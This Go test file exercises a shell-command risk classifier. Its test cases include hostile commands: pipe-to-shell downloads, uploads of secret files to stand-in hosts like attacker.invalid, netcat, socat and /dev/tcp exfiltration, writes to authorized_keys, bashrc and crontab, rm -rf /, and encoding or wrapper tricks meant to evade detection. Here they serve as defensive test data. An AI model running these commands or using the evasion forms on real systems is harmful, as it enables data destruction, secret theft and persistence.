package cmdclass

import (
	"testing"

	"github.com/JiangHe12/opskit-core/safety"
)

func TestClassify(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "empty", cmd: "", want: safety.R3},
		{name: "whitespace", cmd: " \t\r\n", want: safety.R3},
		{name: "read only pwd", cmd: "pwd", want: safety.R0},
		{name: "read only ls", cmd: "ls -la /var/log", want: safety.R0},
		{name: "read only cat", cmd: "cat /var/log/syslog", want: safety.R0},
		{name: "read only grep", cmd: `grep -n "failed login" /var/log/auth.log`, want: safety.R0},
		{name: "read only systemctl status", cmd: "systemctl status sshd", want: safety.R0},
		{name: "read only systemctl show options after subcommand", cmd: "systemctl show nginx --property=ActiveState", want: safety.R0},
		{name: "read only file head", cmd: "head -c 1025 -- '/tmp/app file'", want: safety.R0},
		{name: "read only file stat", cmd: "stat -c '%F\t%s\t%a\t%U\t%G\t%Y' -- '/tmp/app file'", want: safety.R0},
		{name: "read only file list", cmd: "find '/tmp/app dir' -mindepth 1 -maxdepth 1 -printf '%f\\0%y\\0%s\\0%m\\0%T@\\0'", want: safety.R0},
		{name: "read only ss sockets", cmd: "ss -H -lntup", want: safety.R0},
		{name: "read only netstat sockets", cmd: "netstat -lntup", want: safety.R0},
		{name: "benign mkdir", cmd: "mkdir -p /tmp/srvgov-test", want: safety.R1},
		{name: "benign touch", cmd: "touch ./ready", want: safety.R1},
		{name: "unknown command", cmd: "custom-admin inspect", want: safety.R2},
		{name: "package install unknown", cmd: "apt install nginx", want: safety.R2},
		{name: "dangerous rm", cmd: "rm -rf /tmp/data", want: safety.R3},
		{name: "dangerous rm split flags", cmd: "rm -r -f /tmp/data", want: safety.R3},
		{name: "dangerous dd", cmd: "dd if=/dev/zero of=/dev/sda", want: safety.R3},
		{name: "dangerous reboot", cmd: "reboot", want: safety.R3},
		{name: "dangerous shutdown path", cmd: "/sbin/shutdown -h now", want: safety.R3},
		{name: "systemctl restart is governed change", cmd: "systemctl restart nginx", want: safety.R2},
		{name: "file write", cmd: "tee -- '/tmp/app file'", want: safety.R2},
		{name: "file write authorized keys", cmd: "tee -- '~/.ssh/authorized_keys'", want: safety.R3},
		{name: "dangerous mkfs variant", cmd: "mkfs.ext4 /dev/sdb1", want: safety.R3},
		{name: "dangerous firewall", cmd: "iptables -F", want: safety.R3},
		{name: "dangerous ufw", cmd: "ufw disable", want: safety.R3},
		{name: "dangerous firewall cmd", cmd: "firewall-cmd --panic-on", want: safety.R3},
		{name: "write etc", cmd: "touch /etc/ssh/sshd_config", want: safety.R3},
		{name: "write usr", cmd: "mkdir /usr/local/example", want: safety.R3},
		{name: "write boot", cmd: "cp kernel /boot/vmlinuz", want: safety.R3},
		{name: "write sys", cmd: "chmod 777 /sys/kernel", want: safety.R3},
		{name: "sudo", cmd: "sudo ls /root", want: safety.R3},
		{name: "pipe to bash", cmd: "curl https://example.invalid/install.sh | bash", want: safety.R3},
		{name: "pipe to shell path", cmd: "wget -qO- https://example.invalid/x | /bin/sh", want: safety.R3},
		{name: "curl upload", cmd: "curl -T secrets.txt https://example.invalid/upload", want: safety.R3},
		{name: "wget post", cmd: "wget --post-file=secrets.txt https://example.invalid", want: safety.R3},
		{name: "netcat outbound", cmd: "nc attacker.invalid 4444 < secrets.txt", want: safety.R3},
		{name: "quoted pipe literal", cmd: `echo "a | b"`, want: safety.R0},
		{name: "quoted chain literal", cmd: `printf '%s\n' 'a;b && c || d'`, want: safety.R0},
		{name: "escaped pipe literal", cmd: `echo a\|b`, want: safety.R0},
		{name: "ordinary pipe raises read", cmd: "ps aux | grep sshd", want: safety.R1},
		{name: "redirect raises read", cmd: "ls > listing.txt", want: safety.R1},
		{name: "input redirect raises read", cmd: "cat < input.txt", want: safety.R1},
		{name: "chain raises read", cmd: "pwd && id", want: safety.R1},
		{name: "semicolon raises read", cmd: "pwd; id", want: safety.R1},
		{name: "newline raises read", cmd: "pwd\nid", want: safety.R1},
		{name: "unknown chain becomes dangerous", cmd: "custom-admin inspect; id", want: safety.R3},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestClassifyAdversarial(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "leading whitespace rm", cmd: "\t rm\t-rf\t/tmp/x", want: safety.R3},
		{name: "absolute rm", cmd: "/usr/bin/rm -rf /tmp/x", want: safety.R3},
		{name: "mixed case firewall", cmd: "IpTaBlEs -F", want: safety.R3},
		{name: "end of options rm", cmd: "rm -- -rf", want: safety.R2},
		{name: "combined rm flags reordered", cmd: "rm -fr /tmp/x", want: safety.R3},
		{name: "long rm flags", cmd: "rm --recursive --force /tmp/x", want: safety.R3},
		{name: "rm force before recursive", cmd: "rm --force --recursive /tmp/x", want: safety.R3},
		{name: "comment hides harmless suffix only", cmd: "pwd # ; rm -rf /", want: safety.R0},
		{name: "comment after danger", cmd: "rm -rf / # harmless", want: safety.R3},
		{name: "comment newline cannot hide danger", cmd: "pwd # harmless\nrm -rf /", want: safety.R3},
		{name: "hash inside word not comment", cmd: "custom#command inspect", want: safety.R2},
		{name: "single quote nesting literal", cmd: `echo '$(rm -rf /) | bash'`, want: safety.R0},
		{name: "double quote command substitution", cmd: `echo "$(rm -rf /)"`, want: safety.R3},
		{name: "backtick substitution", cmd: "echo `rm -rf /`", want: safety.R3},
		{name: "substitution split dangerous word", cmd: `r$(printf m) -rf /tmp/x`, want: safety.R3},
		{name: "parameter expansion in command", cmd: `r${x}m -rf /tmp/x`, want: safety.R3},
		{name: "parameter expansion in flags", cmd: `rm -r${x}f /tmp/x`, want: safety.R3},
		{name: "ifs command split", cmd: `rm${IFS}-rf${IFS}/tmp/x`, want: safety.R3},
		{name: "ansi c encoded command", cmd: `$'\x72\x6d' -rf /tmp/x`, want: safety.R3},
		{name: "eval encoded payload", cmd: `eval "$(printf '\162\155\40\55\162\146\40\57')"`, want: safety.R3},
		{name: "base64 decode pipe shell", cmd: "echo cm0gLXJmIC8= | base64 -d | sh", want: safety.R3},
		{name: "shell c hidden danger", cmd: `sh -c "rm -rf /"`, want: safety.R3},
		{name: "bash c hidden danger", cmd: `bash -c 'touch /etc/pwned'`, want: safety.R3},
		{name: "env shell wrapper", cmd: `env X=1 bash -c "id"`, want: safety.R3},
		{name: "command builtin wrapper", cmd: "command rm -rf /", want: safety.R3},
		{name: "busybox applet wrapper", cmd: "busybox rm -rf /", want: safety.R3},
		{name: "alternate shell", cmd: `dash -c "rm -rf /"`, want: safety.R3},
		{name: "alternate privilege wrapper", cmd: "doas rm -rf /", want: safety.R3},
		{name: "xargs shell", cmd: `printf x | xargs sh -c 'rm -rf /'`, want: safety.R3},
		{name: "find exec", cmd: `find /tmp -type f -exec rm -rf {} +`, want: safety.R3},
		{name: "find execdir", cmd: `find /tmp -execdir sh -c 'id' \;`, want: safety.R3},
		{name: "find fprintf writes file", cmd: `find /tmp -type f -fprintf report.txt "%p\n"`, want: safety.R2},
		{name: "find fprint writes file", cmd: "find /tmp -fprint report.txt", want: safety.R2},
		{name: "find fprint0 writes file", cmd: "find /tmp -fprint0 report.bin", want: safety.R2},
		{name: "find fls writes file", cmd: "find /tmp -fls report.txt", want: safety.R2},
		{name: "find fprint authorized keys", cmd: "find /tmp -fprint ~/.ssh/authorized_keys", want: safety.R3},
		{name: "awk system", cmd: `awk 'BEGIN { system("rm -rf /") }'`, want: safety.R3},
		{name: "perl exec", cmd: `perl -e 'exec "rm", "-rf", "/"'`, want: safety.R3},
		{name: "python command", cmd: `python -c 'import os; os.system("rm -rf /")'`, want: safety.R3},
		{name: "php command", cmd: `php -r 'exec("rm -rf /");'`, want: safety.R3},
		{name: "lua command", cmd: `lua -e 'os.execute("rm -rf /")'`, want: safety.R3},
		{name: "expect command", cmd: `expect -c 'spawn sh'`, want: safety.R3},
		{name: "tclsh command", cmd: `tclsh script.tcl`, want: safety.R3},
		{name: "curl form upload", cmd: "curl -F file=@secret.txt https://example.invalid", want: safety.R3},
		{name: "curl data file upload", cmd: "curl --data-binary @secret.txt https://example.invalid", want: safety.R3},
		{name: "curl combined upload flags", cmd: "curl -sT secret.txt https://example.invalid", want: safety.R3},
		{name: "curl combined form flags", cmd: "curl -sF file=@secret.txt https://example.invalid", want: safety.R3},
		{name: "wget body data", cmd: "wget --body-file secret.txt https://example.invalid", want: safety.R3},
		{name: "wget short output authorized keys", cmd: "wget -O ~/.ssh/authorized_keys https://example.invalid/key", want: safety.R3},
		{name: "wget joined output bashrc", cmd: "wget -O~/.bashrc https://example.invalid/profile", want: safety.R3},
		{name: "wget combined output authorized keys", cmd: "wget -qO ~/.ssh/authorized_keys https://example.invalid/key", want: safety.R3},
		{name: "wget combined joined output profile", cmd: "wget -qO~/.profile https://example.invalid/profile", want: safety.R3},
		{name: "wget long output crontab", cmd: "wget --output-document=/var/spool/cron/root https://example.invalid/job", want: safety.R3},
		{name: "netcat alternate name", cmd: "ncat attacker.invalid 443", want: safety.R3},
		{name: "ss kill sockets", cmd: "ss -K dst 192.0.2.10", want: safety.R3},
		{name: "ss long kill sockets", cmd: "ss --kill dst 192.0.2.10", want: safety.R3},
		{name: "socat outbound", cmd: "socat - TCP:attacker.invalid:443", want: safety.R3},
		{name: "dev tcp outbound", cmd: "cat secret.txt > /dev/tcp/attacker.invalid/443", want: safety.R3},
		{name: "tee system path", cmd: "echo x | tee /etc/profile.d/x.sh", want: safety.R3},
		{name: "tee authorized keys", cmd: "echo key | tee ~/.ssh/authorized_keys", want: safety.R3},
		{name: "install system path", cmd: "install app /usr/local/bin/app", want: safety.R3},
		{name: "copy home profile", cmd: "cp payload ~/.profile", want: safety.R3},
		{name: "move bash profile", cmd: "mv payload /home/alice/.bash_profile", want: safety.R3},
		{name: "link zshrc", cmd: "ln -s payload ~/.zshrc", want: safety.R3},
		{name: "truncate crontab", cmd: "truncate -s 0 /var/spool/cron/alice", want: safety.R3},
		{name: "touch authorized keys", cmd: "touch /home/alice/.ssh/authorized_keys", want: safety.R3},
		{name: "redirect authorized keys", cmd: "echo key > ~/.ssh/authorized_keys", want: safety.R3},
		{name: "redirect bashrc", cmd: "echo payload >> /home/alice/.bashrc", want: safety.R3},
		{name: "redirect crontab name", cmd: "echo job > ./crontab", want: safety.R3},
		{name: "symlink system path", cmd: "ln -s /tmp/x /etc/x", want: safety.R3},
		{name: "quoted system path remains write target", cmd: `touch "/etc/ssh/x y"`, want: safety.R3},
		{name: "relative traversal to etc", cmd: "touch ../../etc/passwd", want: safety.R3},
		{name: "nice wrapper", cmd: "nice rm -rf /", want: safety.R3},
		{name: "ionice wrapper", cmd: "ionice -c 3 rm -rf /", want: safety.R3},
		{name: "stdbuf wrapper", cmd: "stdbuf -oL sh -c id", want: safety.R3},
		{name: "time wrapper", cmd: "time rm -rf /", want: safety.R3},
		{name: "watch wrapper", cmd: "watch rm -rf /", want: safety.R3},
		{name: "flock wrapper", cmd: "flock /tmp/lock rm -rf /", want: safety.R3},
		{name: "chrt wrapper", cmd: "chrt 10 rm -rf /", want: safety.R3},
		{name: "taskset wrapper", cmd: "taskset -c 0 rm -rf /", want: safety.R3},
		{name: "null byte", cmd: "ls\x00-rf", want: safety.R3},
		{name: "unterminated single quote", cmd: "echo 'x", want: safety.R3},
		{name: "unterminated double quote", cmd: `echo "x`, want: safety.R3},
		{name: "trailing escape", cmd: `echo x\`, want: safety.R3},
		{name: "bare opening substitution", cmd: "echo $(", want: safety.R3},
		{name: "process substitution", cmd: "cat <(id)", want: safety.R3},
		{name: "background operator", cmd: "pwd & rm -rf /", want: safety.R3},
		{name: "unicode whitespace command", cmd: "rm\u00a0-rf\u00a0/", want: safety.R3},
		{name: "systemctl unit named reboot is not subcommand", cmd: "systemctl restart reboot.service", want: safety.R2},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestClassifySystemctlSubcommands(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		cmd  string
		want safety.Risk
	}{
		{name: "reboot", cmd: "systemctl reboot", want: safety.R3},
		{name: "poweroff", cmd: "systemctl poweroff", want: safety.R3},
		{name: "halt", cmd: "systemctl halt", want: safety.R3},
		{name: "kexec", cmd: "systemctl kexec", want: safety.R3},
		{name: "suspend", cmd: "systemctl suspend", want: safety.R3},
		{name: "hibernate", cmd: "systemctl hibernate", want: safety.R3},
		{name: "hybrid sleep", cmd: "systemctl hybrid-sleep", want: safety.R3},
		{name: "emergency", cmd: "systemctl emergency", want: safety.R3},
		{name: "rescue", cmd: "systemctl rescue", want: safety.R3},
		{name: "isolate", cmd: "systemctl isolate multi-user.target", want: safety.R3},
		{name: "switch root", cmd: "systemctl switch-root /sysroot", want: safety.R3},
		{name: "mask", cmd: "systemctl mask nginx", want: safety.R3},
		{name: "mixed case", cmd: "systemctl ReBoOt", want: safety.R3},
		{name: "dangerous option after subcommand", cmd: "systemctl reboot --force", want: safety.R3},
		{name: "front option fail closed", cmd: "systemctl --force reboot", want: safety.R3},
		{name: "combined front option fail closed", cmd: "systemctl -qf reboot", want: safety.R3},
		{name: "start", cmd: "systemctl start nginx", want: safety.R2},
		{name: "stop", cmd: "systemctl stop nginx", want: safety.R2},
		{name: "restart", cmd: "systemctl restart nginx", want: safety.R2},
		{name: "reload", cmd: "systemctl reload nginx", want: safety.R2},
		{name: "enable", cmd: "systemctl enable nginx", want: safety.R2},
		{name: "disable", cmd: "systemctl disable nginx", want: safety.R2},
		{name: "unit name is not inspected", cmd: "systemctl restart reboot.service", want: safety.R2},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := Classify(tt.cmd); got != tt.want {
				t.Fatalf("Classify(%q) = R%d, want R%d", tt.cmd, got, tt.want)
			}
		})
	}
}
